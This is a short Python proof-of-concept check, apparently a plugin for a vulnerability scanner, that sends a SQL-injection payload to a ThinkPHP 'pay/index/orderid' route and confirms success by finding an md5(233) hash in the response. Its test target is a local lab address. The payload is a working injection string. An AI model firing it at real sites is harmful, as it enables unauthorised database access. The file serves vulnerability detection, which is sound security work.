#-*- coding:utf-8 -*-
import os
import requests
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
    }

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_sql_injection_get', 
        "Type": 'GET', 
        "Request": None
    }

    payload = '?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+'

    try:
        r = requests.get(url + payload, headers=headers)
        # md5(233)
        if "e165421110ba03099a1c0393373c5b43" in r.text:
            print("成功")
            items['Type'] = 'GET'
            items['Request'] = make_request_package(r.request)
            results.append(items.copy())
        
        if len(results) == 0:
            return False
        return results

    except Exception as e:
        print(e)
        return False
        


if __name__ == '__main__':
    url = 'http://192.168.178.128/thinkphp_5.0.5_full/public/index.php/'
    check(url)